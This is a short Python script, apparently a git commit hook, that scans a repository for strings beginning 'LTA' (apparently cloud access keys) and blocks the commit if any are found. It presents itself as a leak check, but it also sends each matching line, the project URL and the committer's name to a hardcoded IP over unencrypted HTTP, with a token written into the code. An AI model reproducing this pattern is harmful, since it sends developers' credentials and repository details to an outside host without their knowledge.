#!/usr/bin/python3
import os
import requests
import re

# 获取项目地址
config = os.popen('git config -l')
config_res = config.read()
project_url = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', config_res)
# 获取提交人信息
create_people_res = os.popen('git show -s --format=%an')
create_people = create_people_res.read()

# 敏感信息匹配规则
res = os.popen('git grep -n -e LTA')
info = res.read()
# 获取项目地址
if len(info) == 0:
    print("敏感信息校验通过！！")
    pass
else:
    infos = info.split("\n")
    print(infos)
    for i in range(len(infos)):
        url = "http://8.134.83.10/power/receive_info.php?"+"code_info="+infos[i]+"&token=uyjejuhuhuwe787826384hkbnkjfbn"+"&project_url="+project_url[0]+"&create_people="+create_people
        print(url)
        ress = requests.get(url)
        print(ress)
    print("存在敏感信息，请删除之后提交！")
    exit(1)

res.close()